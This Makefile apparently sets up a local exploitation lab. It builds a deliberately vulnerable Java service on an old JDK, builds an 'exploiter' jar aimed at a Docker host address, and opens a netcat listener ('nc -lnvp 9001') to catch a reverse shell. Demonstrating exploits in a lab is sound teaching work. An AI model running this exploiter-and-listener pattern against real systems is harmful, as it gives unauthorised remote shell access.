.PHONY: build-vulnerable-service build-exploiter start-vulnerable-service start-exploiter start-nc clean all

jdk1.8.0_181:
	@echo Please download JDK 1.8.0_181 and decompress it on this directory before continue.
	@echo Oracle JDK 1.8.0_181 can be found at https://www.oracle.com/br/java/technologies/javase/javase8-archive-downloads.html
	@exit 1

build-vulnerable-service:
	JAVA_HOME=${PWD}/jdk1.8.0_181 mvn -f vulnerable-service/pom.xml clean package
	docker-compose -f vulnerable-service/docker-compose.yml build

build-exploiter:
	mvn clean package -f exploiter/pom.xml

vulnerable-service/target: build-vulnerable-service

start-vulnerable-service: vulnerable-service/target
	docker-compose -f vulnerable-service/docker-compose.yml up

exploiter/target: build-exploiter 

start-exploiter: exploiter/target
	@cd exploiter && java -jar target/*.jar 172.17.0.1 8000 9001

start-nc:
	nc -lnvp 9001

clean:
	docker-compose -f vulnerable-service/docker-compose.yml down
	mvn -f vulnerable-service/pom.xml clean
	mvn -f exploiter/pom.xml clean

all: jdk1.8.0_181 build-vulnerable-service build-exploiter
	@echo \\nAll set! Now open three separated terminals and run the following command.
	@echo -e \\tterminal 1: make start-vulnerable-service 
	@echo -e \\tterminal 2: make start-exploiter
	@echo -e \\tterminal 3: make start-nc
	@echo -e \\nOnce you have finished, press CTRL+C on each terminal to interrupt the executions.
